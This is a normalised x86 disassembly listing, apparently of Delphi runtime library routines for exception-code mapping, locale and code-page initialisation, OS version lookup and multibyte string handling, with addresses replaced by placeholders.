mov [ ebp - 0xc ] eax
jmp r-xdata
dec eax
sub eax 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax * 8 + rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov dl 0x1
call sub_447a00
mov [ ebp - 0xc ] eax
jmp r-xdata
jmp r-xdata
call sub_447c00
mov [ ebp - 0xc ] eax
sub_447d10
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447db7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44e378
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_44cb78
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push 0x2
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447dbe
lea eax [ ebp - 0x30 ]
call sub_44cae0
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
sub_447dd8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447d10
mov [ ebp - 0x10 ] eax
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_447dc8
mov esp ebp
pop ebp
retn 0x4
sub_447e10
push ebp
mov ebp esp
add esp 0xfffffff8
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
pop ecx
pop ecx
pop ebp
retn
sub_447e40
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov [ ebp - 0x5 ] 0x6
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov [ ebp - 0x5 ] 0xe
jmp r-xdata
sub eax 0x3d
je r-xdata
mov [ ebp - 0x5 ] 0xc
jmp r-xdata
sub eax 0xc0000093
je r-xdata
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov [ ebp - 0x5 ] 0xd
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x9
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov [ ebp - 0x5 ] 0x7
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov [ ebp - 0x5 ] 0x16
mov [ ebp - 0x5 ] 0x3
jmp r-xdata
dec eax
je r-xdata
mov [ ebp - 0x5 ] 0x8
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0xb
jmp r-xdata
sub eax 0x87
je r-xdata
mov [ ebp - 0x5 ] 0x5
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x5 ] 0x4
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_447ef4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_447e40
mov [ ebp - 0x9 ] al
xor eax eax
mov al [ ebp - 0x9 ]
mov eax [ eax * 8 + rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_447f20
push ebp
mov ebp esp
add esp 0xfffffe84
xor eax eax
mov [ ebp - 0x17c ] eax
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x160 ] eax
mov [ ebp - 0x15c ] eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4480f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x178 ] eax
mov [ ebp - 0x174 ] 0x5
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x16c ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x168 ] eax
mov [ ebp - 0x164 ] 0x5
lea eax [ ebp - 0x178 ]
push eax
push 0x2
lea edx [ ebp - 0x17c ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x17c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x131 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] eax
push 0x1c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x1c ] 0x1000
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] 0x5
lea eax [ ebp - 0x15c ]
lea edx [ ebp - 0x131 ]
mov ecx 0x105
call sub_44cd10
mov eax [ ebp - 0x15c ]
lea edx [ ebp - 0x158 ]
call sub_4466ac
mov eax [ ebp - 0x158 ]
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x148 ] 0xb
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x144 ] eax
mov [ ebp - 0x140 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x13c ] eax
mov [ ebp - 0x138 ] 0x5
lea eax [ ebp - 0x154 ]
push eax
push 0x3
lea edx [ ebp - 0x160 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x160 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4480fd
lea eax [ ebp - 0x17c ]
call sub_44cae0
lea eax [ ebp - 0x160 ]
mov edx 0x3
call sub_44cb04
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_448104
push ebp
mov ebp esp
add esp 0xffffffe4
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4481f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_447e40
and eax 0xff
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
add eax 0xfffffffd
sub eax 0x8
jb r-xdata
mov eax [ ebp - 0xc ]
lea eax [ eax * 8 + rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov dl 0x1
call sub_447a00
mov [ ebp - 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
push ebp
call sub_447f20
pop ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec eax
sub eax 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4481f7
lea eax [ ebp - 0x1c ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0xeefface
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x0
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov edx r-xdata
call sub_44cb34
sub_448240
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_448301
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
mov [ rw-data ] eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_447ef4
mov eax [ rw-data ]
mov [ eax ] sub_448104
mov eax [ rw-data ]
mov [ eax ] sub_447dd8
mov eax [ rw-data ]
mov [ eax ] sub_447e10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448308
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_44cb04
retn
sub_44830c
push ebp
mov ebp esp
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_44c070
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
pop ebp
retn
sub_44837c
push ebp
mov ebp esp
add esp 0xffffff6c
mov [ ebp - 0x94 ] 0x94
lea eax [ ebp - 0x94 ]
push eax
call GetVersionExA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x84 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x90 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x88 ]
mov [ rw-data ] eax
mov eax rw-data
lea edx [ ebp - 0x80 ]
mov ecx 0x80
call sub_44cd10
sub_4483e4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp [ edx + eax ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
and eax 0x80000001
jns r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
test eax eax
jne r-xdata
dec eax
or eax 0xfffffffe
inc eax
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov [ ebp - 0x9 ] 0x2
jmp r-xdata
mov [ ebp - 0x9 ] 0x1
sub_448490
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44cf24
mov edx [ ebp - 0x8 ]
dec edx
call sub_4483e4
mov [ ebp - 0x9 ] al
sub_4484c4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4483e4
mov [ ebp - 0x9 ] al
sub_4484f4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_44cf24
push eax
mov eax [ ebp - 0x8 ]
call sub_44cf24
pop edx
call sub_448614
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_44cf24
mov edx [ ebp - 0x10 ]
sub edx eax
inc edx
mov [ ebp - 0xc ] edx
sub_448540
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446284
mov eax [ ebp - 0x4 ]
call sub_44cd60
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
call sub_44d04c
mov [ ebp - 0xc ] 0x1
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
call sub_44cf30
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
mov cl [ ebx + ecx - 0x1 ]
mov [ eax + edx - 0x1 ] cl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov al [ edx + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0xc ]
mov al [ eax + edx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_44cf30
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
mov ebx [ ebp - 0x4 ]
mov cl [ ebx + ecx - 0x1 ]
mov [ eax + edx - 0x1 ] cl
jmp r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp - 0x8 ]
call sub_44cf30
mov edx [ ebp - 0xc ]
add [ eax + edx - 0x1 ] 0x20
jmp r-xdata
sub_448614
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4467d0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
call sub_4467d0
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446984
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
sub edx eax
cmp edx [ ebp - 0x14 ]
jae r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4484c4
mov [ ebp - 0x15 ] al
cmp [ ebp - 0x15 ] 0x2
je r-xdata
cmp [ ebp - 0x15 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_446984
mov [ ebp - 0xc ] eax
inc [ ebp - 0xc ]
sub_4486ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44873c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
inc [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44873c
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_44873c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_446964
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4484c4
sub al 0x1
jb r-xdata
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0xc ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0xc ]
call sub_446964
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_448794
push ebp
mov ebp esp
add esp 0xffffffdc
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ax [ ebp - 0x4 ]
mov [ ebp - 0x6 ] ax
cmp [ ebp - 0x6 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
cmp [ rw-data ] 0x0
je r-xdata
mov ax [ ebp - 0x6 ]
and ax 0x3ff
mov [ rw-data ] ax
movzx eax [ ebp - 0x6 ]
shr eax 0xa
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x24 ]
push eax
push 0x0
call GetCPInfo
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0xc
jge r-xdata
mov eax [ ebp - 0xc ]
mov al [ ebp + eax - 0x1e ]
mov edx [ ebp - 0xc ]
or al [ ebp + edx - 0x1d ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov al [ ebp + eax - 0x1e ]
mov edx [ ebp - 0xc ]
mov dl [ ebp + edx - 0x1d ]
sub dl al
jb r-xdata
add [ ebp - 0xc ] 0x2
inc edx
mov [ ebp - 0xe ] dl
mov [ ebp - 0xd ] al
mov al [ ebp - 0xd ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0xd ]
dec [ ebp - 0xe ]
jne r-xdata
sub_448884
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xor eax eax
push ebp
push sub_448b6d
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_448794
call sub_447200
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x14 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax [ ebp - 0x10 ]
call sub_447124
mov edx [ ebp - 0x14 ]
mov eax rw-data
call sub_44cb34
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_446490
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_446490
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax [ ebp - 0x10 ]
call sub_447180
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax [ ebp - 0x10 ]
call sub_447180
mov [ rw-data ] al
lea eax [ ebp - 0x20 ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x20 ]
xor edx edx
call sub_446490
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax [ ebp - 0x10 ]
call sub_447180
mov [ rw-data ] al
lea eax [ ebp - 0x28 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_4474d0
mov edx [ ebp - 0x24 ]
mov eax rw-data
call sub_44cb34
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4474d0
mov edx [ ebp - 0x2c ]
mov eax rw-data
call sub_44cb34
mov cl 0x3a
mov edx 0x1e
mov eax [ ebp - 0x10 ]
call sub_447180
mov [ rw-data ] al
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax [ ebp - 0x10 ]
call sub_447124
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_44cb34
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax [ ebp - 0x10 ]
call sub_447124
mov edx [ ebp - 0x38 ]
mov eax rw-data
call sub_44cb34
lea eax [ ebp - 0x8 ]
call sub_44cae0
lea eax [ ebp - 0xc ]
call sub_44cae0
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_446490
test eax eax
jne r-xdata
call sub_44740c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44cb78
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44cb78
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_44ce20
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_44ce20
mov cl 0x2c
mov edx 0xc
mov eax [ ebp - 0x10 ]
call sub_447180
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b74
lea eax [ ebp - 0x44 ]
mov edx 0xd
call sub_44cb04
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_44cb04
retn
lea eax [ ebp - 0x44 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x44 ]
xor edx edx
call sub_446490
test eax eax
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax [ ebp - 0x10 ]
call sub_447124
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_446490
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_44cb78
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_44cb78
jmp r-xdata
sub_448c18
push ebp
mov ebp esp
add esp 0xffffffe4
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_448cb7
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4470c0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x18 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448cbe
lea eax [ ebp - 0x1c ]
call sub_44cae0
retn
sub_448cc4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
call sub_448c18
sub_448ce8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x1 ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ebx [ ebp - 0x8 ]
call [ ebx + 0x4 ]
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
sub_448d24
push ebp
mov ebp esp
push ecx
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_44ba74
pop ecx
pop ebp
retn
sub_448d58
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GetProcAddress
mov [ rw-data ] eax
pop ecx
pop ebp
retn
mov eax r-xdata
mov [ rw-data ] eax
sub_448dbc
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
add eax 0x4
push eax
call InitializeCriticalSection
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] eax
push 0x4
mov eax [ ebp - 0x4 ]
add eax 0x28
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44dd90
add esp 0x4
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
